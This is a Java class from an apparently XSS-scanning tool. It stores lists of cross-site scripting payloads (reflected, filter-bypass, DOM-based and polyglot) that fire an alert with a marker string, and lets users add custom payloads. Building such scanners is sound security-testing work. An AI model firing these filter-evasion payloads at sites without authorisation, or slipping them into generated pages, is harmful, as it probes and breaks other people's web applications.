package com.xsssentinel.payloads;

import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

public class PayloadManager {

    // Unique marker — short and distinctive
    public static final String MARKER = "xsssentinel";

    // Basic reflected XSS payloads
    private static final List<String> BASIC_PAYLOADS = Arrays.asList(
            "<script>alert('" + MARKER + "')</script>",
            "<img src=x onerror=alert('" + MARKER + "')>",
            "<svg onload=alert('" + MARKER + "')>",
            "\"><script>alert('" + MARKER + "')</script>",
            "'><script>alert('" + MARKER + "')</script>",
            "<body onload=alert('" + MARKER + "')>",
            "<details open ontoggle=alert('" + MARKER + "')>"
    );

    // Filter bypass payloads
    private static final List<String> BYPASS_PAYLOADS = Arrays.asList(
            "<ScRiPt>alert('" + MARKER + "')</ScRiPt>",
            "<img src=x onerror=alert`" + MARKER + "`>",
            "<svg/onload=alert('" + MARKER + "')>",
            "<input autofocus onfocus=alert('" + MARKER + "')>",
            "<select autofocus onfocus=alert('" + MARKER + "')>",
            "<video><source onerror=alert('" + MARKER + "')>",
            "<iframe src=javascript:alert('" + MARKER + "')>"
    );

    // DOM-based XSS payloads
    private static final List<String> DOM_PAYLOADS = Arrays.asList(
            "#<img src=x onerror=alert('" + MARKER + "')>",
            "'-alert('" + MARKER + "')-'",
            "\"-alert('" + MARKER + "')-\""
    );

    // Polyglot payloads
    private static final List<String> POLYGLOT_PAYLOADS = Arrays.asList(
            "'\"-->></styles></script><svg onload=alert('" + MARKER + "')>",
            "<script>/*'/*`/*\"/*</script><svg onload=alert('" + MARKER + "')/*>",
            "\">'><svg onload=alert('" + MARKER + "')>"
    );

    // User custom payloads
    private final List<String> customPayloads =
            new java.util.ArrayList<>();

    public List<String> getBasicPayloads() {
        return BASIC_PAYLOADS;
    }

    public List<String> getBypassPayloads() {
        return BYPASS_PAYLOADS;
    }

    public List<String> getDomPayloads() {
        return DOM_PAYLOADS;
    }

    public List<String> getPolyglotPayloads() {
        return POLYGLOT_PAYLOADS;
    }

    public List<String> getCustomPayloads() {
        return customPayloads;
    }

    public List<String> getAllBuiltInPayloads() {
        return Arrays.asList(
                        BASIC_PAYLOADS,
                        BYPASS_PAYLOADS,
                        DOM_PAYLOADS,
                        POLYGLOT_PAYLOADS
                ).stream()
                .flatMap(List::stream)
                .collect(Collectors.toList());
    }

    public void addCustomPayload(String payload) {
        if (payload != null && !payload.trim().isEmpty()) {
            customPayloads.add(payload.trim());
        }
    }

    public void removeCustomPayload(String payload) {
        customPayloads.remove(payload);
    }

    public void clearCustomPayloads() {
        customPayloads.clear();
    }

    public List<String> getAllPayloads() {
        return Arrays.asList(
                        BASIC_PAYLOADS,
                        BYPASS_PAYLOADS,
                        DOM_PAYLOADS,
                        POLYGLOT_PAYLOADS,
                        customPayloads
                ).stream()
                .flatMap(List::stream)
                .collect(Collectors.toList());
    }
}